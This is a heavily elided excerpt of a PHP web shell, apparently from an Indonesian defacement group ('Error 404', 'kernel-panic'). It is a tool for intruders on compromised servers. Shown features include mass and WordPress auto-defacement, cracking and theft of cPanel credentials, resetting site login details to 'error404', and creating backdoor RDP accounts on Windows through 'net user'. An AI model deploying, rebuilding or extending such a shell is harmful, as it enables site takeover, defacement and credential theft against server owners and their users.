...
<html>
<head>
<title>Jalan Tukang Error 404</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
...
<meta name='author' content='Error404'>
<meta charset="UTF-8">
<style type='text/css'>
...
if($_GET['logout'] == true) {
	...
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by Error 404</textarea><br>
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='error404' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='error404' placeholder='pass_baru'><br>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses nyolong ".$i." Cpanel by <font color=lime>Error 404</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>sukses deface ".$i." Cpanel by <font color=lime>Error 404</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by Error 404' placeholder='New Title'><br><br>
		Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
		<span>Jika pilih <u>Y</u> masukin script deface Anda ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
	...
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Error 404'><br>
		<u>Domains</u>: <br>
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Error 404' required><br>
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Error404' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form></center>";
	}
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user error404");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>error404</font>] -> ";
					if($cek) {
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='error404' required>
			<input type='text' name='pass' placeholder='password' value='error404' required>
	...
	echo "<center>Powered ".date("Y")." by <a href='http://facebook.com/zaky.doktrin' target='_blank'><font color=lime>kernel-panic</font></a></center>";
}
?>
</html>
